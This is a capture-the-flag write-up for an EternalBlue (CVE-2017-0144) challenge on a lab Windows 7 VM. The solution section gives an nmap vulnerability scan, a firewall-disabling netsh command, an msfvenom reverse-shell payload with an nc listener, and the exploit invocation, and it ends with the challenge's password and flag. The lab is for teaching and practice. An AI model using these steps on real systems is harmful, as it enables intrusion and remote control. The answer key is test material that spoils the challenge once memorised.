# BlueDoor Writeup

## Challenge Information

Link: https://github.com/sethwhy/BlueDoor/tree/main

Difficulty: 3/5

Category/Categories: Exploitation, Windows

Author(s): Seth Davis
References(s): worawit & strik1r

Description:

```
Can you exploit the EternalBlue vulnerability (CVE-2017-0144) on a Windows 7 system and retrieve the hidden flag? Your goal is to gain administrative privileges and locate the flag.txt file stored in the `C:\Windows\System32` directory.

This challenge simulates a real-world vulnerability and requires you to analyze the system, execute an exploit, and navigate to the restricted file location.

```

Hint(s):

- `Hidden in plain sight, more like plain text!`
- `Hmm System32 huh..`

When you first start the challenge, you are presented with:

A Windows 7 virtual machine vulnerable to EternalBlue (CVE-2017-0144).
A flag hidden in the system, requiring administrative privileges to access.

## Solution

```
1. Environment Setup:
Install and configure Kali Linux in your virtual environment (e.g., VMware, VirtualBox).
Ensure that your IP address matches the subnet of the target machine.

2. Network Scanning:
Use nmap to scan for open ports and detect if the target is vulnerable:
nmap -p 139,445 --script smb-vuln-ms17-010 <target-ip>
Confirm that TCP ports 139 and 445 are open and that the SMB service is vulnerable.
![net-scan](image-1.png)

3. Disable Firewalls (on the target)
If possible, run:
netsh advfirewall set allprofiles state off
This ensures no interference during the exploitation process.
![firewall-off](image.png)
Password for Flag user that isnt the flag: 4770_sethwhy

4. Exploit EternalBlue:
Use Metasploit or any other payload generator to create a reverse TCP payload.
Some links for help the way I did it - https://github.com/helviojunior/MS17-010, https://github.com/worawit/MS17-010, https://redteamzone.com/EternalBlue/, https://www.rapid7.com/blog/post/2017/05/20/metasploit-the-power-of-the-community-and-eternalblue/

Assemble shellcode & create payload
- nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
- msfvenom -p windows/x64/shell_reverse_tcp LHOST=<VM kali machine ip> LPORT=<listen port i.e 4445> -a x64 -f raw -o sc_x64_msf.bin EXITFUNC=thread
(There are other ways to do this, im giving you one solution)

- Set up a listener on your attacking machine:
nc -lvnp 4445
![listener-launch](image-3.png)

- Run the command "python eternalblue_exploit7 <target-ip> <any shellcode that works>"

- Deliver the payload to the target and exploit the vulnerability.
![SMB1-connection](image-2.png)

5. Gain Administrative Privileges:
Once inside the system, check to see if privileges were escalated.
![whoami](image-4.png)

6. Search for the Flag:
Look for .txt files in the C:\Windows\System32 directory with this command:
dir *.txt /s /b
![txt-scan](image-5.png)

Locate and open the flag.txt file to retrieve its contents.
![flag-content](image-6.png)
```

Flag: `CTF{4770_sethwhy}`